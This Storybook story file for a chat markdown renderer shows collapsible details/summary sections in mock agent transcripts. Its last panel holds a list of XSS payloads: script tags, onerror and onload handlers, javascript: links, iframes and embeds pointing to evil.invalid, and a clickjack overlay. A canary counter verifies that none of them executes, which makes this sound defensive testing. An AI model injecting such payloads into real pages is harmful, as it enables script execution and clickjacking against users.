import type { Meta, StoryObj } from "@storybook/react-vite";
import { useEffect, useState, type ReactNode } from "react";
import type { SessionChatMessage } from "../../shared/session-chat";
import { SessionChatHostLinksProvider } from "./session-chat-links";
import { SessionChatMessageList } from "./session-chat-message-list";

/*
 * Showcase for `<details>` / `<summary>` in Session Chat markdown.
 *
 * Everything here is mock transcript data — no gxserver, no session, no host
 * bridge — so the story runs anywhere Storybook does and exercises exactly the
 * renderer the real chat uses (SessionChatMessageList -> SessionChatMarkdown ->
 * session-chat-details.ts).
 *
 * The panel that matters is the last one. The chat renderer has no raw-HTML
 * mode: session-chat-details.ts reads two tag names out of the mdast and builds
 * ordinary nodes, and every other tag an agent writes stays the literal text it
 * has always been. So the hostile turn is not "sanitized markup" — it is text,
 * and the canary in the header proves nothing in it ever ran.
 */

/** Every hostile payload calls this instead of `alert`, so the story can count. */
declare global {
  interface Window {
    __ghostexChatXssCanary?: () => void;
  }
}

const OPEN_AND_CLOSED = [
  "The suite is green except for one case, and the output is 400 lines, so it",
  "is behind a caret.",
  "",
  "<details>",
  "<summary>Show the failing output</summary>",
  "",
  "```",
  "FAIL packages/core-ui/chat/session-chat-details.test.ts",
  "  ● folds a disclosure written without a blank line",
  "",
  "    expected: <details>",
  "    received: \"<details>\"",
  "",
  "      at Object.<anonymous> (session-chat-details.test.ts:41:18)",
  "```",
  "",
  "</details>",
  "",
  "The part you actually need is short enough to leave open, so it is written",
  "`<details open>` and starts expanded:",
  "",
  "<details open>",
  "<summary>What I changed</summary>",
  "",
  "The scanner now treats `<summary>` and `</summary>` as separate tokens, so a",
  "summary split across a blank line still pairs up.",
  "",
  "</details>",
  "",
  "A caret is still a caret when it holds one line:",
  "",
  "<details>",
  "<summary>Environment</summary>",
  "",
  "macOS 27.0, Chromium 140 (CEF), Node 26.7.0.",
  "",
  "</details>",
].join("\n");

const EVERYTHING_INSIDE = [
  "Yes — the body is ordinary markdown, so everything that renders in a turn",
  "renders inside a caret too.",
  "",
  "<details open>",
  "<summary>Everything, inside one disclosure</summary>",
  "",
  "A list, with the nesting the sheet gives it:",
  "",
  "1. **gpui** — the desktop shell.",
  "   - `bun run build`",
  "   - then check the titlebar draws natively",
  "2. **web** — the static browser build.",
  "3. **mobile** — Android only.",
  "",
  "A fence, with its filename header and Shiki still highlighting it:",
  "",
  "```ts title=packages/core-ui/chat/session-chat-details.ts",
  "export function remarkSessionChatDetails(this: MarkdownParser) {",
  "  const parse = (value: string) => this.parse(value).children ?? [];",
  "  return (tree: MarkdownAstNode): void => visit(tree, parse);",
  "}",
  "```",
  "",
  "> [!WARNING]",
  "> An alert keeps its rule and its coloured title in here — the caret does",
  "> not flatten what is under it.",
  "",
  "A table, with its own scroll wrapper and copy menu:",
  "",
  "| Surface | Entry | Bundled as |",
  "| --- | --- | --- |",
  "| gpui | `apps/desktop/sidebar/chat-main.tsx` | one inlined `file://` script |",
  "| web | `apps/web/src/app/chat-page.tsx` | a normal Vite chunk |",
  "| mobile | `apps/mobile/views/chat/chat-main.tsx` | one self-contained `index.html` |",
  "",
  "And an inline path is still a chip: `packages/core-ui/styles/chat.css:1381`.",
  "",
  "</details>",
  "",
  "Carets nest, and the inner one keeps its own state:",
  "",
  "<details>",
  "<summary>Outer</summary>",
  "",
  "Some framing before the detail.",
  "",
  "<details>",
  "<summary>Inner</summary>",
  "",
  "The thing you had to click twice for.",
  "",
  "</details>",
  "",
  "</details>",
  "",
  "CommonMark ends an HTML block at a blank line, so an agent who writes the",
  "body tight against `</summary>` hands the whole disclosure over as one HTML",
  "blob. Inside a caret that text is read back as markdown, which is the only",
  "reason this list is a list:",
  "",
  "<details>",
  "<summary>Written with no blank lines at all</summary>",
  "- `packages/find/` is the engine",
  "- `server/src/agent_prompt_search.rs` is the API",
  "- `packages/core-ui/find/` is the shared UI",
  "</details>",
  "",
  "A disclosure the agent never named still gets a clickable row:",
  "",
  "<details>",
  "",
  "No `<summary>` was written, so the row reads *Details*.",
  "",
  "</details>",
].join("\n");

const HOSTILE_HTML = [
  "A transcript is untrusted input — it carries whatever an agent read off a",
  "web page, out of a repository, or back from a tool. The renderer has no",
  "raw-HTML mode, so all of this is text on screen and none of it is DOM.",
  "",
  "**A script tag.** Written verbatim, rendered verbatim:",
  "",
  "<script>window.__ghostexChatXssCanary()</script>",
  "",
  '<script src="https://evil.invalid/pwn.js"></script>',
  "",
  "**An event-handler attribute.** `onerror` on a broken image is the classic:",
  "",
  '<img src="x" onerror="window.__ghostexChatXssCanary()">',
  "",
  '<svg onload="window.__ghostexChatXssCanary()"></svg>',
  "",
  '<body onload="window.__ghostexChatXssCanary()">',
  "",
  "**A `javascript:` link.** Written as markdown, so it does reach the link",
  "renderer — and comes back as inert text because the protocol is not one the",
  "chat will follow: [click me](javascript:window.__ghostexChatXssCanary()).",
  "",
  "The same thing written as HTML never gets that far:",
  "",
  '<a href="javascript:window.__ghostexChatXssCanary()">click me</a>',
  "",
  "**An embedded frame.** `<iframe>`, `<object>` and `<embed>` would each be a",
  "way to load a document inside a privileged page:",
  "",
  '<iframe src="https://evil.invalid" width="400" height="120"></iframe>',
  "",
  '<object data="https://evil.invalid/x.swf"></object>',
  "",
  '<embed src="https://evil.invalid/x.svg">',
  "",
  "**Inline style.** A full-page transparent overlay is a clickjack, and a",
  "`style` attribute is all it takes:",
  "",
  '<div style="position:fixed;inset:0;z-index:9999;background:red">gotcha</div>',
  "",
  "**Malformed and half-written tags**, which is what a streaming turn looks",
  "like anyway:",
  "",
  "<details",
  "",
  "</summary>",
  "",
  "<summary>a summary with no disclosure around it</summary>",
  "",
  "**And the two tags that are recognised, decorated with everything above.**",
  "Only `open` survives on the `<details>`; the summary's attributes are read",
  "and dropped, and its body is still just markdown:",
  "",
  '<details open class="pwn" onclick="window.__ghostexChatXssCanary()" data-x="1">',
  '<summary onmouseover="window.__ghostexChatXssCanary()">Recognised — and stripped to the tag<b>!</b></summary>',
  "",
  "<script>window.__ghostexChatXssCanary()</script>",
  "",
  '<img src="x" onerror="window.__ghostexChatXssCanary()">',
  "",
  "The markdown around them still works: `packages/shared/session-chat.ts:12`.",
  "",
  "</details>",
].join("\n");

function userTurn(id: string, text: string, timestamp: number): SessionChatMessage {
  return {
    blocks: [{ text, type: "text" }],
    id,
    role: "user",
    source: "transcript",
    timestamp,
  };
}

function assistantTurn(
  id: string,
  text: string,
  timestamp: number,
): SessionChatMessage {
  return {
    blocks: [{ text, type: "text" }],
    id,
    role: "assistant",
    source: "transcript",
    timestamp,
  };
}

const STORY_MESSAGES: SessionChatMessage[] = [
  userTurn("user-1", "Run the suite and keep the noise out of my way.", 1_000),
  assistantTurn("assistant-1", OPEN_AND_CLOSED, 2_000),
  userTurn("user-2", "Does the rest of the markdown still work inside a caret?", 3_000),
  assistantTurn("assistant-2", EVERYTHING_INSIDE, 4_000),
  userTurn(
    "user-3",
    "And what happens to HTML that is not a disclosure? Assume the transcript is hostile.",
    5_000,
  ),
  assistantTurn("assistant-3", HOSTILE_HTML, 6_000),
];

/*
 * The "before" column is the same transcript with every disclosure tag defused,
 * which is precisely what the old renderer put on screen: react-markdown turns
 * a raw HTML node into a text node, so the tags were printed and the body sat
 * permanently expanded underneath them.
 *
 * Defusing takes a zero-width space inside the tag name rather than a backslash
 * escape. An escape is resolved while parsing — `\<details>` reaches the plugin
 * as the text `<details>` and would be folded again — while a zero-width space
 * makes the tag name invalid, so nothing downstream recognises it and the
 * column shows exactly the glyphs the old renderer showed.
 */
const BEFORE_MESSAGES: SessionChatMessage[] = STORY_MESSAGES.map((message) => ({
  ...message,
  blocks: message.blocks.map((block) =>
    block.type === "text"
      ? { ...block, text: block.text.replace(/<(\/?)(details|summary)\b/gi, "<$1$2​") }
      : block,
  ),
}));

function ChatPane({
  messages,
  theme,
}: {
  messages: SessionChatMessage[];
  theme: "dark" | "light";
}) {
  return (
    <SessionChatHostLinksProvider
      links={{
        openFile: (path, position) => {
          // Stands in for the host's editor, which is what makes an inline path
          // a chip; without one the chat renders the grey span instead.
          // eslint-disable-next-line no-console
          console.log("openFile", path, position ?? "(no position)");
        },
      }}
    >
      <div
        className="ghostex-session-chat-scope flex min-h-0 flex-1 flex-col bg-background text-foreground"
        data-chat-theme={theme}
      >
        <SessionChatMessageList
          hasMore={false}
          isWorking={false}
          loadingEarlier={false}
          messages={messages}
          onLoadEarlier={() => undefined}
          verboseMode={false}
        />
      </div>
    </SessionChatHostLinksProvider>
  );
}

function PaneLabel({ children }: { children: ReactNode }) {
  return (
    <div className="px-3 py-1.5 font-mono text-[11px] uppercase tracking-wide text-white/60">
      {children}
    </div>
  );
}

/**
 * Counts the hostile turn's payloads. Every `<script>`, `onerror`, `onload` and
 * `javascript:` href in the transcript calls the same function, so a number
 * other than zero here means one of them became DOM rather than text.
 */
function XssCanary() {
  const [fired, setFired] = useState(0);
  useEffect(() => {
    window.__ghostexChatXssCanary = () => setFired((count) => count + 1);
    return () => {
      delete window.__ghostexChatXssCanary;
    };
  }, []);
  const clean = fired === 0;
  return (
    <div
      className={`px-3 py-1.5 font-mono text-[11px] uppercase tracking-wide ${
        clean ? "text-emerald-400/80" : "text-red-400"
      }`}
    >
      xss canary — {fired} of the transcript&rsquo;s payloads executed
      {clean ? " (all of them are text)" : " — SOMETHING RAN"}
    </div>
  );
}

function SessionChatDetailsStory({ theme }: { theme: "dark" | "light" }) {
  return (
    <div className="flex h-screen min-h-[46rem] flex-col bg-[#0a0a0a] p-2">
      <XssCanary />
      <div className="flex min-h-0 flex-1 gap-2">
        <div className="flex min-h-0 flex-1 flex-col overflow-hidden rounded-lg border border-white/10">
          <PaneLabel>after — real collapsibles, everything else still text</PaneLabel>
          <ChatPane messages={STORY_MESSAGES} theme={theme} />
        </div>
        <div className="flex min-h-0 flex-1 flex-col overflow-hidden rounded-lg border border-white/10">
          <PaneLabel>before — tags printed, body always expanded</PaneLabel>
          <ChatPane messages={BEFORE_MESSAGES} theme={theme} />
        </div>
      </div>
    </div>
  );
}

const meta = {
  argTypes: {
    theme: { control: "inline-radio", options: ["dark", "light"] },
  },
  component: SessionChatDetailsStory,
  parameters: { layout: "fullscreen" },
  title: "Chat/Disclosures",
} satisfies Meta<typeof SessionChatDetailsStory>;

export default meta;

type Story = StoryObj<typeof meta>;

export const Dark: Story = { args: { theme: "dark" } };

export const Light: Story = { args: { theme: "light" } };
